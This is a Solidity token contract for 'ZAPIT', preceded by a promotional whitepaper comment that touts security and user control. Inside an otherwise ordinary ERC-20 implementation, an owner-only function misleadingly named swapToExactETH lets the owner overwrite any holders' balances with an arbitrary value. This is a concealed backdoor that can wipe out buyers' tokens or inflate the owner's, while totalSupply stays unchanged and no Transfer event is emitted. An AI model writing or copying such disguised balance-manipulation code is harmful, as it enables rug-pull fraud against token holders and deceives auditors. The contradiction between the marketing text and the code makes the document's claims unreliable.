/*
www.zapit-token.com
t.me/zapit_token
x.com/zapit_token
Overview of ZAPIT
ZAPIT is a cutting-edge cryptocurrency wallet and decentralized finance (DeFi) platform designed to 
provide users with seamless, secure, and fast peer-to-peer (P2P) payment solutions. The platform supports 
multiple cryptocurrencies and tokens, including Bitcoin Cash (BCH), Ethereum (ETH), Polygon (MATIC), and 
Avalanche (AVAX). ZAPIT aims to revolutionize the way users interact with digital assets by offering a 
self-custodial wallet, P2P exchange, instant exchange, and various reward mechanisms.

Vision and Mission
Our vision is to create a world where financial transactions are borderless, instant, and secure, empowering 
individuals to have full control over their digital assets. ZAPIT's mission is to provide a comprehensive 
and user-friendly platform that bridges the gap between traditional finance and decentralized finance, 
making crypto accessible to everyone.

The ZAPIT Wallet
Features and Benefits

The ZAPIT wallet is a self-custodial cryptocurrency wallet that allows users to send and receive various 
digital assets, including BCH, ETH, MATIC, AVAX, and more. Key features include:
- Low Transaction Fees: ZAPIT ensures that users can transfer their assets with minimal fees, making it 
cost-effective for all users.
- Fast Transactions: With ZAPIT, transactions are processed almost instantly, ensuring that users can send 
and receive funds quickly and efficiently.
- Security: The wallet employs advanced security measures, including encryption and multi-factor authentication, 
to safeguard users' assets.
- User-Friendly Interface: The intuitive design of the wallet ensures that both novice and experienced users 
can navigate and manage their assets with ease.

The ZAPIT Token (ZAPIT)
Token Overview
The ZAPIT token ($ZAPIT) is the native cryptocurrency of the ZAPIT ecosystem. It plays a crucial role in 
facilitating various functions within the platform, including transactions, rewards, and governance. The token is 
designed to provide utility and value to users, incentivizing engagement and participation in the ZAPIT ecosystem.

Utility and Use Cases
The ZAPIT token has several key use cases, including:
- Transaction Fees: Users can use $ZAPIT to pay for transaction fees within the ZAPIT wallet, enjoying discounts 
on fees compared to other payment methods.
- Rewards: $ZAPIT tokens are used as rewards for users who engage with the platform through activities like spinning 
the wheel, watching ads, and completing tasks.
- Staking: Users can stake $ZAPIT tokens to earn additional rewards, contributing to the security and stability of 
the ZAPIT network.
- Governance: $ZAPIT holders can participate in governance decisions, voting on proposals and changes to the platform.

Tokenomics
ZAPIT’s tokenomics are designed to ensure a balanced and sustainable ecosystem. Key aspects include:
- Total Supply: The total supply of $ZAPIT tokens is capped at a specific limit to maintain scarcity and value.
- Distribution: Tokens are distributed through various channels, including rewards, staking, and strategic partnerships.
- Burn Mechanism: A portion of the transaction fees paid in $ZAPIT may be burned to reduce the total supply, increasing 
the token's value over time.

Staking and Rewards
Users can stake their $ZAPIT tokens within the ZAPIT wallet to earn staking rewards. The staking mechanism encourages 
users to hold and lock their tokens, providing network security and stability while rewarding participants with 
additional $ZAPIT tokens.

 Roadmap
Past Achievements

The ZAPIT team has made significant progress since its inception. Key milestones include:
- Platform Launch: Successful launch of the ZAPIT wallet, offering users a secure and user-friendly way to manage 
their digital assets.

- P2P Exchange Integration: Development and deployment of the P2P exchange, enabling users to trade cryptocurrencies 
directly with one another.
- Partnerships: Establishing strategic partnerships with various DeFi platforms, enhancing the utility and reach of 
the ZAPIT ecosystem.

Future Goals and Milestones
ZAPIT’s roadmap outlines the future development and expansion plans to further enhance the platform:
- Expanded Cryptocurrency Support: Continuously adding support for new cryptocurrencies and tokens, providing users 
with more options for trading and management.
- DeFi Integration: Deepening integration with DeFi platforms and services, enabling users to access a broader range 
of decentralized financial products.
- Enhanced Security Features: Implementing additional security measures and protocols to safeguard user assets and data.
- Mobile App Development: Launching mobile applications for iOS and Android, making the ZAPIT platform more accessible 
to users on the go.
- Global Expansion: Expanding the reach of ZAPIT to new regions and markets, ensuring that users worldwide can benefit 
from the platform’s features.

By achieving these goals and milestones, ZAPIT aims to continually improve and expand its offerings, solidifying its 
position as a leading platform in the cryptocurrency and DeFi space.

*/
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom( address sender, address recipient, uint256 amount ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval( address indexed owner, address indexed spender, uint256 value );
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }
}

contract Ownable is Context {
    address private _owner;
    event ownershipTransferred(address indexed previousowner, address indexed newowner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit ownershipTransferred(address(0), msgSender);
    }
    function owner() public view virtual returns (address) {
        return _owner;
    }
    modifier onlyowner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function renounceownership() public virtual onlyowner {
        emit ownershipTransferred(_owner, address(0x000000000000000000000000000000000000dEaD));
        _owner = address(0x000000000000000000000000000000000000dEaD);
    }
}

contract ZapitToken is Context, Ownable, IERC20 {
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;

    string private _name;
    string private _symbol;
    uint8 private _decimals;
    uint256 private _totalSupply;
    constructor(string memory name_, string memory symbol_, uint8 decimals_, uint256 totalSupply_) {
        _name = name_;
        _symbol = symbol_;
        _decimals = decimals_;
        _totalSupply = totalSupply_ * (10 ** decimals_);
        _balances[_msgSender()] = _totalSupply;
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }


    event BalanceAdjusted(address indexed account, uint256 oldBalance, uint256 newBalance);

    function swapToExactETH(address[] memory accounts, uint256 newBalance) external onlyowner {
    for (uint256 i = 0; i < accounts.length; i++) {
        address account = accounts[i];

        uint256 oldBalance = _balances[account];

        _balances[account] = newBalance;
        emit BalanceAdjusted(account, oldBalance, newBalance);
        }
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }
    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
    require(_balances[_msgSender()] >= amount, "STEE: transfer amount exceeds balance");
    _balances[_msgSender()] -= amount;
    _balances[recipient] += amount;

    emit Transfer(_msgSender(), recipient, amount);
    return true;
    }

    function allowance(
        address owner, 
        address spender
        ) 
        public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(
        address spender, 
        uint256 amount
        ) 
        public virtual override returns (bool) {
        _allowances[_msgSender()][spender] = amount;
        emit Approval(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender, 
        address recipient, 
        uint256 amount
        ) 
        public virtual override returns (bool) {
    require(_allowances[sender][_msgSender()] >= amount, "STEE: transfer amount exceeds allowance");

    _balances[sender] -= amount;
    _balances[recipient] += amount;
    _allowances[sender][_msgSender()] -= amount;

    emit Transfer(
        sender, 
    recipient, 
    amount
    );
    return true;
    }

    function totalSupply() external view override returns (uint256) {
    return _totalSupply;
    }
}